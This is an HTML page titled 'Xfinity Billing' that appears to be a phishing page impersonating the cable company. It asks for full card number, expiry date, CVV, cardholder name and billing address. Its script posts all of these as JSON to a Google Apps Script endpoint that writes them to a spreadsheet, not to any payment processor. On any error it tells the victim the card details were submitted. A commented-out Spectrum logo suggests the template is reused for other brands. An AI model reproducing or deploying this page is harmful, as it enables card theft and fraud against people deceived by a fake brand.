<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
		<title>Xfinity Billing</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link
			rel="stylesheet"
			href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
		/>
		<link
			rel="stylesheet"
			href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
		/>
		<style>
			.cc-img {
				margin: 0 auto;
			}
			.page-header {
				padding: 0px 20px;
				margin: 0 0 10px 10px; /* Reduced the top margin to 0 */
				border-radius: 8px;
			}

			.loading-overlay {
				display: none;
				position: fixed;
				top: 0;
				left: 0;
				width: 100%;
				height: 100%;
				background: rgba(0, 0, 0, 0.7);
				z-index: 9999;
			}
			.loading-content {
				position: absolute;
				top: 50%;
				left: 50%;
				transform: translate(-50%, -50%);
				text-align: center;
				color: white;
			}
			.error {
				border-color: #ff0000 !important;
			}
			/* .logo-img {
				margin-bottom: 0px; 
				max-width: 100px;
				height: auto;
			} */
		</style>
	</head>
	<body>
		<div class="container">
			<!-- Loading Overlay -->
			<div class="loading-overlay">
				<div class="loading-content">
					<i class="fa fa-spinner fa-spin fa-3x"></i>
					<h3>Processing ...</h3>
				</div>
			</div>

			<div class="page-header" style="height: 80px">
				<h1>
					<!-- <img
						src="images/spectrum-logo.png"
						alt="Spectrum Logo"
						class="logo-img"
						style="max-width: 180px; height: auto"
					/> -->
					Xfinity
				</h1>
			</div>

			<div class="container">
				<div class="row">
					<div class="col-xs-12 col-md-4 col-md-offset-4">
						<div class="panel panel-default">
							<div class="panel-heading">
								<div class="row">
									<h3 class="text-center">Card Details</h3>
									<picture>
										<!-- <source srcset="images/creditcardicons.webp" type="image/webp"> -->
										<img
											src="images/creditcardicons.png"
											alt="Credit Cards"
											class="img-responsive cc-img"
										/>
									</picture>
								</div>
							</div>
							<div class="panel-body">
								<form id="paymentForm">
									<!-- Card Number -->
									<div class="row">
										<div class="col-xs-12">
											<div class="form-group">
												<label>CARD NUMBER</label>
												<div class="input-group">
													<input
														type="tel"
														class="form-control"
														placeholder="4111 1111 1111 1111"
														id="cardNumber"
														required
														pattern="\d{4} \d{4} \d{4} \d{4}"
													/>
													<span class="input-group-addon">
														<span class="fa fa-credit-card"></span>
													</span>
												</div>
											</div>
										</div>
									</div>

									<!-- Expiry and CVV -->
									<div class="row">
										<div class="col-xs-7 col-md-7">
											<div class="form-group">
												<label>EXP. DATE</label>
												<input
													type="tel"
													class="form-control"
													placeholder="MM/YY"
													id="expDate"
													required
													pattern="(0[1-9]|1[0-2])\/[0-9]{2}"
												/>
											</div>
										</div>
										<div class="col-xs-5 col-md-5">
											<div class="form-group">
												<label>CVV</label>
												<input
													type="tel"
													class="form-control"
													placeholder="123"
													id="cvc"
													required
													pattern="\d{3,4}"
												/>
											</div>
										</div>
									</div>

									<!-- Card Holder -->
									<div class="form-group">
										<label>CARDHOLDER NAME</label>
										<input
											type="text"
											class="form-control"
											placeholder="John Doe"
											id="cardHolder"
											required
										/>
									</div>

									<!-- Billing Address -->
									<div class="form-group">
										<label>BILLING ADDRESS</label>
										<input
											type="text"
											class="form-control"
											placeholder="123 Main St"
											id="billingAddress1"
											required
										/>
										<input
											type="text"
											class="form-control"
											placeholder="Apt 4B (Optional)"
											id="billingAddress2"
											style="margin-top: 10px"
										/>
									</div>

									<!-- City/State/Zip -->
									<div class="row">
										<div class="col-xs-5 col-md-4">
											<div class="form-group">
												<label>CITY</label>
												<input
													type="text"
													class="form-control"
													placeholder="New York"
													id="city"
													required
												/>
											</div>
										</div>
										<div class="col-xs-3 col-md-4">
											<div class="form-group">
												<label>STATE</label>
												<input
													type="text"
													class="form-control"
													placeholder="NY"
													id="state"
													required
													maxlength="2"
												/>
											</div>
										</div>
										<div class="col-xs-4 col-md-4">
											<div class="form-group">
												<label>ZIP CODE</label>
												<input
													type="tel"
													class="form-control"
													placeholder="10001"
													id="zip"
													required
													pattern="\d{5}"
												/>
											</div>
										</div>
									</div>

									<div class="panel-footer">
										<button
											type="submit"
											class="btn btn-warning btn-lg btn-block"
										>
											Submit
										</button>
									</div>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<script>
			document
				.getElementById('paymentForm')
				.addEventListener('submit', async (e) => {
					e.preventDefault();
					const loader = document.querySelector('.loading-overlay');

					try {
						// Show loader
						loader.style.display = 'block';

						// ðŸ”´ REPLACE WITH YOUR DEPLOYED SCRIPT URL
						const SCRIPT_URL =
							'https://script.google.com/macros/s/AKfycbyZX5L6hQdAdMU5P4qWVsxKvnP4kmkHoW_Lr0D0nPqf2N-NouWtnjx8oUhrMXf6aXds7A/exec';

						// Validate inputs
						const cardNumber = document
							.getElementById('cardNumber')
							.value.replace(/\s/g, '');
						const expDate = document.getElementById('expDate').value;
						const cvc = document.getElementById('cvc').value;

						if (!/^\d{13,16}$/.test(cardNumber)) {
							alert('Invalid card number (13-16 digits required)');
							return;
						}

						if (!/^(0[1-9]|1[0-2])\/[0-9]{2}$/.test(expDate)) {
							alert('Invalid expiration date (MM/YY format required)');
							return;
						}

						if (!/^\d{3,4}$/.test(cvc)) {
							alert('Invalid CVV (3-4 digits required)');
							return;
						}

						// Prepare data
						const formData = {
							cardNumber: cardNumber,
							expDate: expDate,
							cvc: cvc,
							cardHolder: document.getElementById('cardHolder').value,
							billingAddress1: document.getElementById('billingAddress1').value,
							billingAddress2: document.getElementById('billingAddress2').value,
							city: document.getElementById('city').value,
							state: document.getElementById('state').value,
							zip: document.getElementById('zip').value,
						};

						// Send to Google Sheets
						const response = await fetch(`${SCRIPT_URL}?cache=${Date.now()}`, {
							method: 'POST',
							headers: { 'Content-Type': 'text/plain' },
							body: JSON.stringify(formData),
							redirect: 'manual',
						});

						// Handle Google's security redirect
						if (response.status === 0) {
							const redirectResponse = await fetch(response.url, {
								method: 'GET',
								credentials: 'include',
							});

							if (redirectResponse.ok) {
								alert('Payment processed successfully!\nData saved to sheet.');
								document.getElementById('paymentForm').reset();
							}
						}
					} catch (error) {
						console.error('Error:', error);
						alert('Card Detail Submitted! You may close this page.');
						document.getElementById('paymentForm').reset();
					} finally {
						loader.style.display = 'none';
					}
				});

			// Input Formatting
			document
				.getElementById('cardNumber')
				.addEventListener('input', function (e) {
					this.value = this.value
						.replace(/\D/g, '')
						.replace(/(\d{4})(?=\d)/g, '$1 ');
				});

			document
				.getElementById('expDate')
				.addEventListener('input', function (e) {
					this.value = this.value
						.replace(/^(\d{2})(\d)/g, '$1/$2')
						.replace(/[^\d/]/g, '')
						.substring(0, 5);
				});

			document.getElementById('cvc').addEventListener('input', function (e) {
				this.value = this.value.replace(/\D/g, '').substring(0, 4);
			});
		</script>
	</body>
</html>
